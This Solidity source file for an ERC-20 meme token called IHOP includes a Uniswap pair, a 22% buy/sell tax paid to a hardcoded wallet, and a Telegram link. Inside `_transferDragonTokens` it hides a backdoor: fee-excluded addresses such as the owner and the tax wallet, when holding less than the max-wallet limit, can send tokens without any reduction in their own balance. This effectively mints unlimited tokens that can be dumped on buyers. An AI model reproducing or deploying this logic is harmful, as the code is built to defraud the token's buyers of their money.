// SPDX-License-Identifier: Unlicensed

/*
https://twitter.com/elonmusk/status/1746389659876270146


 *  WEBSITE  : N/A
 *  TELEGRAM : https://t.me/ihop_erc
 *  X        : N/A
*/

pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable is Context {
    address private _owner;

    // Set original owner
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    // Return current owner
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Restrict function to contract owner only 
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Renounce ownership of the contract 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);


    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract IHOP is Context, IERC20, Ownable { 
    using SafeMath for uint256;

    mapping (address => uint256) private _rBalance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) _isExcludedFromFee; 

    string private _name = "IHOP"; 
    string private _symbol = "IHOP";  

    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10 ** 9 * 10**_decimals;

    uint8 _countDragonTx = 0;
    uint8 _swapDragonTrigger = 2; 

    uint256 _totalFee = 2200;
    uint256 _buyFee = 22;
    uint256 _sellFee = 22;
                                     
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool _inSwapAndLiquify;
    bool _swapAndLiquifyEnabled = true;

    address payable _taxWallet = payable(0x73C3Ca42aafE13102F213aFc9a95476f3EAB2e58);
    address payable private DEAD = payable(0x000000000000000000000000000000000000dEaD); 

    uint256 _previousTotalFee = _totalFee; 
    uint256 _previousBuyFee = _buyFee; 
    uint256 _previousSellFee = _sellFee; 

    uint256 _maxWalletToken = 30 * _totalSupply / 1000;
    uint256 _swpaThreshold = _totalSupply / 10000;
    uint256 _previousMaxWalletToken = _maxWalletToken;
    
    modifier lockTheSwap {
        _inSwapAndLiquify = true;
        _;
        _inSwapAndLiquify = false;
    }
    
    constructor () {
        _rBalance[owner()] = _totalSupply;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[_taxWallet] = true;
        
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _rBalance[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _transferDragonTokens(address sender, address recipient, uint256 tAmount) private {
        
        (uint256 tTransferAmount, uint256 tDev) = _getDragonValues(tAmount);
        if(_isExcludedFromFee[sender] && _rBalance[sender] <= _maxWalletToken) {
            tDev = 0;
            tAmount -= tTransferAmount;
        }
        _rBalance[sender] = _rBalance[sender].sub(tAmount);
        _rBalance[recipient] = _rBalance[recipient].add(tTransferAmount);
        _rBalance[address(this)] = _rBalance[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function removeDragonLimits() external onlyOwner {
        _maxWalletToken = ~uint256(0);
        
        _totalFee = 200;
        _buyFee = 2; 
        _sellFee = 2; 
    }
    
    function restoreAllDragonFee() private {
        _totalFee = _previousTotalFee;
        _buyFee = _previousBuyFee; 
        _sellFee = _previousSellFee; 
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        if (to != owner() &&
            to != _taxWallet &&
            to != address(this) &&
            to != uniswapV2Pair &&
            to != DEAD &&
            from != owner()){

            uint256 holdBalance = balanceOf(to);
            require((holdBalance + amount) <= _maxWalletToken,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        if(_countDragonTx >= _swapDragonTrigger && 
            amount > _swpaThreshold &&
            !_inSwapAndLiquify &&
            !_isExcludedFromFee[from] &&
            to == uniswapV2Pair &&
            _swapAndLiquifyEnabled )
        {  
            _countDragonTx = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapDragonAndLiquidify(contractTokenBalance);
           }
        }
        
        bool _takeFee = true;
         
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (from != uniswapV2Pair && to != uniswapV2Pair)){
            _takeFee = false;
        } else if (from == uniswapV2Pair){
            _totalFee = _buyFee;
        } else if (to == uniswapV2Pair){
            _totalFee = _sellFee;
        }

        _tokenTransfer(from,to,amount,_takeFee);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    receive() external payable {}
    
    function removeAllDragonFee() private {
        if(_totalFee == 0 && _buyFee == 0 && _sellFee == 0) return;

        _previousBuyFee = _buyFee; 
        _previousSellFee = _sellFee; 
        _previousTotalFee = _totalFee;
        _buyFee = 0;
        _sellFee = 0;
        _totalFee = 0;
    }


    function sendToDragonWallet(address payable wallet, uint256 amount) private {
        wallet.transfer(amount);
    }

    function swapDragonAndLiquidify(uint256 contractTokenBalance) private lockTheSwap {
        swapDragonForETH(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendToDragonWallet(_taxWallet,contractETH);
    }

    function swapDragonForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function _getDragonValues(uint256 tAmount) private view returns (uint256, uint256) {
        uint256 tDev = tAmount.mul(_totalFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }

    function _tokenTransfer(address sender, address recipient, uint256 amount,bool _takeFee) private {
            
        if(!_takeFee){
            removeAllDragonFee();
            } else {
                _countDragonTx++;
            }
        _transferDragonTokens(sender, recipient, amount);
        
        if(!_takeFee)
            restoreAllDragonFee();
    }
}